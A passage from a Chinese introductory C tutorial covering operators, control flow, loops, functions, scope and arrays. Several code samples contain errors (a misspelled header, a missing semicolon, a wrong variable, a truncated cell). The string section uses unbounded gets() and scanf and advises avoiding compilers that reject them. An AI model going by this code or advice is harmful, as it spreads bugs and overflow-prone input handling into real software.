i=i-5; 可以写作 i-=5;
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="关系运算符">关系运算符&lt;/h3>
&lt;p>这里假设A=10，B=20&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">运算符&lt;/th>
&lt;th style="text-align:left">描述&lt;/th>
&lt;th style="text-align:left">实例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">==&lt;/td>
&lt;td style="text-align:left">检查两个操作数的值是否相等，如果相等则条件为真。&lt;/td>
&lt;td style="text-align:left">(A == B) 不为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">!=&lt;/td>
&lt;td style="text-align:left">检查两个操作数的值是否相等，如果不相等则条件为真。&lt;/td>
&lt;td style="text-align:left">(A != B) 为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;gt;&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否大于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;gt; B) 不为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;lt;&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否小于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;lt; B) 为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;gt;=&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;gt;= B) 不为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;lt;=&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;lt;= B) 为真。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="逻辑运算符">逻辑运算符&lt;/h3>
&lt;p>这里假设A=10，B=20&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">运算符&lt;/th>
&lt;th style="text-align:left">描述&lt;/th>
&lt;th style="text-align:left">实例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">&amp;amp;&amp;amp;&lt;/td>
&lt;td style="text-align:left">称为逻辑与运算符。如果两个操作数都非零，则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;amp;&amp;amp; B) 为假。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">||&lt;/td>
&lt;td style="text-align:left">称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。&lt;/td>
&lt;td style="text-align:left">(A&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">!&lt;/td>
&lt;td style="text-align:left">称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。&lt;/td>
&lt;td style="text-align:left">!(A &amp;amp;&amp;amp; B) 为真。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="按位运算符">按位运算符&lt;/h3>
&lt;p>位运算符作用于位，并逐位执行操作。&amp;amp;、 | 和 ^ 的真值表如下所示：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>p&lt;/th>
&lt;th>q&lt;/th>
&lt;th>p &amp;amp; q&lt;/th>
&lt;th>p | q&lt;/th>
&lt;th>p ^ q&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>假设如果 A = 60，且 B = 13，现在以二进制格式表示，它们如下所示：&lt;/p>
&lt;pre tabindex="0">&lt;code>A = 0011 1100
B = 0000 1101
-----------------
A&amp;amp;B = 0000 1100
A|B = 0011 1101
A^B = 0011 0001
~A = 1100 0011
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>c语言中实际的位运算符&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">位运算符&lt;/th>
&lt;th style="text-align:left">描述&lt;/th>
&lt;th style="text-align:left">实列&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">&amp;amp;&lt;/td>
&lt;td style="text-align:left">按位与操作，按二进制位进行&amp;quot;与&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(A &amp;amp; B) 将得到 12，即为 0000 1100&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">|&lt;/td>
&lt;td style="text-align:left">按位或运算符，按二进制位进行&amp;quot;或&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(A | B) 将得到 61，即为 0011 1101&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">^&lt;/td>
&lt;td style="text-align:left">异或运算符，按二进制位进行&amp;quot;异或&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(A ^ B) 将得到 49，即为 0011 0001&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">~&lt;/td>
&lt;td style="text-align:left">取反运算符，按二进制位进行&amp;quot;取反&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;lt;&amp;lt;&lt;/td>
&lt;td style="text-align:left">二进制左移运算符。将一个运算对象的各二进制位全部左移若干位（左边的二进制位丢弃，右边补0）。&lt;/td>
&lt;td style="text-align:left">A &amp;lt;&amp;lt; 2 将得到 240，即为 1111 0000&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;gt;&amp;gt;&lt;/td>
&lt;td style="text-align:left">二进制右移运算符。将一个数的各二进制位全部右移若干位，正数左补0，负数左补1，右边丢弃。&lt;/td>
&lt;td style="text-align:left">A &amp;gt;&amp;gt; 2 将得到 15，即为 0000 1111&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="条件选择语句">条件选择语句&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>c语言把任意非零，非空的值定义为true，把零或null定义为false&lt;/strong>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="基本if语句">基本if语句&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
if (1) printf(&amp;#34;hallo &amp;#34;);
if (true) {
printf(&amp;#34;world&amp;#34;);
}
int x=10;
if (x) printf(&amp;#34;\n&amp;#34;);
//求a,b,c种的最大值
int a=5,b=2,c=3;
int ans;
if (a&amp;gt;b){
ans=a;
}
else{
if (b&amp;gt;c){
ans=b;
}
else{
ans=c;
}
}
printf(&amp;#34;a=%d,b=%d,c=%d\nMax=%d\n&amp;#34;,a,b,c,ans);
// &amp;amp;&amp;amp;且 ||或
if (a&amp;gt;b &amp;amp;&amp;amp; b&amp;gt;c) printf(&amp;#34;a\n&amp;#34;);
if (a&amp;gt;b || b&amp;gt;c) printf(&amp;#34;b\n&amp;#34;);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>输出如下&lt;/p>
&lt;pre tabindex="0">&lt;code>hallo world
a=5,b=2,c=3
Max=5
b
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>重点&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>c语言的条件判断语句具有短路性质&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>在用&amp;amp;&amp;amp;连接的两个表达式A，B中。如果A的运算值为false，那么表达式B不会运算&lt;/li>
&lt;li>在用||连接的两个表达式A，B中。如果A的运算值为true，那么表达式B不会运算&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int a=1,b=2,c=3;
if (a&amp;gt;b &amp;amp;&amp;amp; ++a) printf(&amp;#34;Yes\n&amp;#34;);
//这里由于a&amp;gt;b不成立，所以a++不会被执行，所以a的值仍然为1,当然prinft语句也不会被执行
if (a&amp;lt;b &amp;amp;&amp;amp; ++a) printf(&amp;#34;%d\n&amp;#34;,a);
//这里由于a&amp;lt;b成立，所以a++也会被执行，这里会运行输出a数值2
if (b&amp;lt;c || ++b) printf(&amp;#34;%d\n&amp;#34;,b);
// ||也是如此，由于b&amp;lt;c成立，于是b++也不会被执行，输出b的数值为2
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>2
2
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="三元运算符">三元运算符&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int n;
printf(&amp;#34;请输入一个数字：&amp;#34;);
scanf(&amp;#34;%d&amp;#34;,&amp;amp;n);
(n&amp;gt;0)?printf(&amp;#34;正数\n&amp;#34;):printf(&amp;#34;负数\n&amp;#34;);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输入&lt;/p>
&lt;pre tabindex="0">&lt;code>请输入一个数字：12
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>正数
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>如上的三元运算符可以近似写成如下的if语句：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>if (n&amp;gt;0) {
printf(&amp;#34;正数&amp;#34;);
}
else {
printf(&amp;#34;负数&amp;#34;);
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="switch语句">switch语句&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int n;
printf(&amp;#34;请输入一个数字：&amp;#34;);
scanf(&amp;#34;%d&amp;#34;,&amp;amp;n);
switch (n){
case 1: printf(&amp;#34;this is case 1\n&amp;#34;);
case 2: printf(&amp;#34;this is case 2\n&amp;#34;); break;
default:
printf(&amp;#34;this is default\n&amp;#34;);
}
return 0;
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>样例输入1&lt;/p>
&lt;pre tabindex="0">&lt;code>1
&lt;/code>&lt;/pre>&lt;p>样例输出1&lt;/p>
&lt;pre tabindex="0">&lt;code>this is case 1
this is case 2
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>样例输入2&lt;/p>
&lt;pre tabindex="0">&lt;code>2
&lt;/code>&lt;/pre>&lt;p>样例输出2&lt;/p>
&lt;pre tabindex="0">&lt;code>this is case 2
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>样例输入3&lt;/p>
&lt;pre tabindex="0">&lt;code>3
&lt;/code>&lt;/pre>&lt;p>样例输出3&lt;/p>
&lt;pre tabindex="0">&lt;code>this is default
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>重点&lt;/p>
&lt;/li>
&lt;li>
&lt;p>每一个case语句分支必须以break;（即返回）结尾，否则case的条件分支都会继续往下执行。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="循环语句">循环语句&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="for循环">for循环&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
// 统计1加到100的和
int i;
int ans=0;
for (i=0;i&amp;lt;=100;i++){
ans=ans+i;
}
printf(&amp;#34;%d\n&amp;#34;,ans);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>5050
&lt;/code>&lt;/pre>&lt;p>下面是 for 循环的控制流：&lt;/p>
&lt;pre tabindex="0">&lt;code>for ( init; condition; increment )
{
statement(s);
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>init 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。&lt;/li>
&lt;li>接下来，会判断 condition。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。&lt;/li>
&lt;li>在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。&lt;/li>
&lt;li>条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。&lt;/li>
&lt;/ul>
&lt;p>在VC 6.0中不支持在init中声明循环控制变量，只允许使用上面的样例代码，否则会有&lt;/p>
&lt;pre tabindex="0">&lt;code>[Error] &amp;#39;for&amp;#39; loop initial declarations are only allowed in C99 or C11 mode
&lt;/code>&lt;/pre>&lt;p>错误，在比较新版本的编译器中，如下写法是被支持的&lt;/p>
&lt;pre tabindex="0">&lt;code>for (int i=0;i&amp;lt;=100;i++) {
ans=ans+1;
}//并且，这里的i变量在循环体结束之后就会被释放销毁，即你在循环体之外是无法再次使用i变量的。
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="while循环">while循环&lt;/h3>
&lt;pre tabindex="0">&lt;code>//求1~100内奇数的和
#include&amp;lt;stdio.h&amp;gt;
int main(){
int i=1;
int ans=0;
while (i&amp;lt;=100){
ans+=i;
i+=2;
}
}
&lt;/code>&lt;/pre>&lt;p>执行逻辑&lt;/p>
&lt;pre tabindex="0">&lt;code>while(condition)
{
statement(s);
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>在这里，statement(s) 可以是一个单独的语句，也可以是几个语句组成的代码块。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>condition 可以是任意的表达式，当为任意非零值时都为 true。当条件为 true 时执行循环。 当条件为 false 时，退出循环，程序流将继续执行紧接着循环的下一条语句。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="do-while循环">do while循环&lt;/h3>
&lt;pre tabindex="0">&lt;code>//计算100以内偶数的和
#include&amp;lt;stido.h&amp;gt;
int main(){
int i=2;
int ans=0;
do{
ans+=i;
i+=2;
}while(i&amp;lt;=100)
}
&lt;/code>&lt;/pre>&lt;p>执行逻辑&lt;/p>
&lt;pre tabindex="0">&lt;code>do
{
statement(s);
}while( condition );
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>与while循环不同的是，条件表达式出现在循环的尾部，所以循环中的 statement(s) 会在条件被测试之前至少执行一次。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果条件为真，控制流会跳转回上面的 do，然后重新执行循环中的 statement(s)。这个过程会不断重复，直到给定条件变为假为止。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="函数">函数&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="c语言中的函数声明">C语言中的函数声明：&lt;/h3>
&lt;pre tabindex="0">&lt;code>返回值类型 函数名(参数类型 参数1,参数类型 参数2 ···){
函数主体
}
实列：
//求a，b中的最大值，并返回该最大值
int Max(int a,int b){
int ret;
(a&amp;gt;=b)?ret=a:ret=b;//还记的这个三元运算符吗？
return ret;
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="函数调用">函数调用&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int Max(int a,int b) {
int ret;
(a&amp;gt;=b)?ret=a:ret=b;
return ret;
}
int main() {
int a=10,b=20;
printf(&amp;#34;%d\n&amp;#34;,Max(a,b));
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>20
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="函数参数">函数参数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>值传递&lt;/p>
&lt;/li>
&lt;li>
&lt;p>c语言默认多数为是传值调用，把参数的实际值赋给函数内的形式参数，在这种情况下在函数内部修改形式参数的值并不会影响实际参数,例子：&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
//函数作用：交换ab的值，这是交换两个数常用写法。
void swap(int a,int b){
int t;
t=a;
a=b;
b=t;
}
int main(){
int a=10,b=20;
printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
swap(a,b);
printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>a=10,b=20
a=10,b=20
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>如你所见，默认情况下在函数内部对传入参数做修改并不会影响实际参数的值&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你想真的向修改传入参数的值，那么就要使用下面将会提到的引用传递(引用传递的实质就是指针的运用)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>引用传递&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
void swap(int *a,int *b){
int t=*a;
*a=*b;
*b=t;
}
int main(){
int a=10,b=20;
printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
swap(&amp;amp;a,&amp;amp;b);
printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>a=10,b=20
a=20,b=10
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="作用域规则">作用域规则&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>作用域指程序定义的变量所存在的区域，超过这个区域，变量就不能被访问。C语言中我们可以在三处地方声明变量：&lt;/p>
&lt;ol>
&lt;li>在函数或者块（这里的块可以是for循环那个的init还记得吗）内部的局部变量&lt;/li>
&lt;li>在所有函数外部的全局变量&lt;/li>
&lt;li>在函数参数中定义的形式参数变量&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>程序查看变量存在并访问的优先级顺序永远是先局部再全局（在某种程度上我们也可以把函数参数声明中定义的形式参数也理解为一种局部变量）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
//全局变量
int g=10;
void func1(int g){
printf(&amp;#34;in func1 g=%d\n&amp;#34;,g);
return;
}
void func2(){
printf(&amp;#34;in func2 g=%d\n&amp;#34;,g);
return;
}
int main(){
//局部变量
int x=20,g=30;
printf(&amp;#34;in main x=%d,g=%d\n&amp;#34;,x,g);
func1(x);//我们把x=20的值赋值给形式参数g
func2();
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>in main x=20,g=30
in func1 g=20
in func2 g=10
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>在main()函数中尝试访问x,g的值并输出显示，程序优先查看局部变量中是否存在x,g,存在于是输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>in main x=20,g=30
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>因为局部变量声明了一个g，所以这里并不会访问全局的g&lt;/li>
&lt;li>在func1()中我们尝试访问变量g，因为变量g在函数参数部分存在声明，是一个形式参数。所以也不会去访问全局变量g。于是输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>in func1 g=20
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>即传入的x的值。&lt;/li>
&lt;li>在func2()中，我们没有在函数内部声明任何局部变量，形式参数，于是这里尝试访问变量g就是访问的全局变量的值，输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>in func2 g=10
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>重点&lt;/p>
&lt;/li>
&lt;li>
&lt;p>全局变量被保存在内存的全局存储区中，占用静态存储空间，并且会被初始化。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>局部变量被保存在一种称为栈的结构中，只有在函数被调用的时候才会真正的被分配存储空间&lt;/p>
&lt;/li>
&lt;li>
&lt;p>局部变量被定义的时候，系统不会对其进行初始化（虽然多数情况下不初始化数值也多为0）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>全局变量系统会自动进行初始化，初始化值如下&lt;/p>
&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">数据类型&lt;/th>
&lt;th style="text-align:left">初始化默认值&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">'\0'&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">pointer(指针)&lt;/td>
&lt;td style="text-align:left">NULL&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="进阶数据结构">进阶数据结构&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="数组">数组&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>数组，是可以存储大小固定类型相同并且个数固定的顺序集合。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>声明方法：&lt;/p>
&lt;pre tabindex="0">&lt;code>数据类型 数组名称[数组大小];
&lt;/code>&lt;/pre>&lt;p>示例：&lt;/p>
&lt;pre tabindex="0">&lt;code>int a[100];
/*
这个实例里我们就定义了一个长度为100的数组，可以存储100个int型数据
*/
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>&lt;strong>注意：C语言中的数组下标从0开始，这里我们定义了一个长度为100的数组a，但是其下标范围事实上是从0到99&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;/li>
&lt;li>
&lt;p>数组初始化&lt;/p>
&lt;pre tabindex="0">&lt;code>int a[10]={0};
//声明一个大小为10的整形数组，并初始化所有元素为0
//还记得吗，下标从0开始哦，0~9
double a[]={0.0,1.1,2.2,3.3}
//你也可以为数组里每个元素单独初始化，如果你这么做的话还可以省略方括号里的数组大小（这个数组大小为4）
int a[10]={0,1,2,3}
//如果规定了数组大小但是没有把每个元素单独赋值，未赋值部分依据上面提到的默认初始化规则初始化。
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;p>数组元素访问&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
//声明一个大小为100的int型数组并初始化所有值为0
int a[100]={0};
//将数组所有元素赋值为1~100
for (int i=0;i&amp;lt;100;i++){
//我们通过 数组名[下标] 的方式访问数组元素
a[i]=i+1;
}
//我们计算数组里所有元素的累加和，即1-100的累加和
int ans=0;
for (int i=0;i&amp;lt;100;i++){
ans+=a[i];
}
//样例输出5050
printf(&amp;#34;%d\n&amp;#34;,ans);
return 0;
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;p>数组在函数之间的传参&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
//计算a数组内所有元素的平均值
double func(int* a,int size){
double average=0;
for (int i=0;i&amp;lt;size;i++)
average+=a[i];
return average/(double)size;
}
/*
其实你可以发现数组传参的方法就是一个“引用传参”
所以数组使用这种方法进行函数传参是可以修改数组元素的
数组函数传参还有别的写法，但是这里只讲解这一种。
希望你养成一个好习惯，数组传参务必带上数组大小
*/
int main(){
//声明初始化一个数组a
int a[5]={1,2,3,4,5};
//打印平均值
printf(&amp;#34;%lf\n&amp;#34;,func(a,5));/
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>数组的本质（重点）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数组本质是一个在内存中线性连续的存储空间&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你在声明数组的时候事实上获得的是一个这个空间的地址&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数组下标就是相对于数组地址的一个偏移量用来确定内部元素的位置&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C语言中你要时刻注意数组下标，因为下标越界有时是不会报错的。&lt;/p>
&lt;p>你声明了一个&lt;/p>
&lt;pre tabindex="0">&lt;code>int a[10]={0}
&lt;/code>&lt;/pre>&lt;p>的数组，你可以使用如下的循环来遍历它&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int a[10]={0};
for(int i=0;i&amp;lt;=10;i++)
printf(&amp;#34;%d &amp;#34;,a[i]);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>0 0 0 0 0 0 0 0 0 0 1
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>我设置了循环条件是i&amp;lt;=10,但是你还记得吗？c语言数组下标从0开始！！！&lt;/p>
&lt;/li>
&lt;li>
&lt;p>所以这里输出了11个数字。你也发现了，我明明初始化了所有的数组元素为0，但是最后却多输出了一个1。这里就是因为我们越界访问。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>最后这个数字1不属于数组的元素，但是你依旧可以访问它。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>所以每当你尝试访问数组的时候，请千万注意数组下标越界问题。因为不检查数组下标越界已经在计算机界造成了许许多多的重大安全问题。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="字符数组">字符数组&lt;/h3>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>字符数组本质还是数组，在大多数情况下和基本数组的操作方式类似。所以接下来我们只讲解字符串数组某些特殊操作。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>字符数组声明以及初始化&lt;/p>
&lt;pre tabindex="0">&lt;code>/*
还记的\0吗，截止符
字符数组内存储的字符串的末尾必须有截止符！
*/
char name[6]={&amp;#39;h&amp;#39;, &amp;#39;e&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;\0&amp;#39;};
//你还可以用这个写法.
char greeting[]=&amp;#34;hello&amp;#34;;
//初始化部分元素也是可以滴
char name[20]=&amp;#34;xiaoming&amp;#34;;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>字符数组的遍历&lt;/p>
&lt;p>因为字符串数组末尾必定有截止符的特性，我们有了一些常用的遍历字符数组的方法：&lt;/p>
&lt;pre tabindex="0">&lt;code>char str[]=&amp;#34;hello world&amp;#34;;
for (int i=0;str[i]!=0;i++){
···
}
int i=0;
while(str[i]!=0){
···
i++;
}
&lt;/code>&lt;/pre>&lt;p>当然你也可以获取字符串长度，然后设定下标i小于等于字符串长度的时候执行循环，不过那样就和普通数组没有区别音次不在此举例。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>字符串的输入输出&lt;/p>
&lt;pre tabindex="0">&lt;code>char str[100];
//输入字符串
gets(str);
scanf(&amp;#34;%s&amp;#34;,&amp;amp;str);
//输出字符串
puts(str);
printf(&amp;#34;%s\n&amp;#34;,str);
/*
之前说到在数组处理，越界并不会被报错
所以这里的输入都存在着极大的安全隐患，于是在Visual studio的最新版本里，出于安全考虑
在默认情况下不允许使用以上函数读取字符串。下面提到的C语言字符串处理函数也是一样，都存在了越界问题
因而在最新的VS中默认不允许使用，这也是我不推荐使用最新版本的VS的原因
*/
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>C语言自带的字符串处理函数&lt;/p>
&lt;ul>
&lt;li>以下函数使用需引入头文件string.h（还记得怎么引入头文件吗？#include&amp;lt;string.h&amp;gt;）&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">函数&lt;/th>
&lt;th style="text-align:left">作用&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">strcpy(s1,s2);&lt;/td>
&lt;td style="text-align:left">复制字符串s2到字符串s1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strcat(s1,s2);&lt;/td>
&lt;td style="text-align:left">连接字符串s2到s1末尾&lt;/td>
&lt;/tr>
&lt;tr>
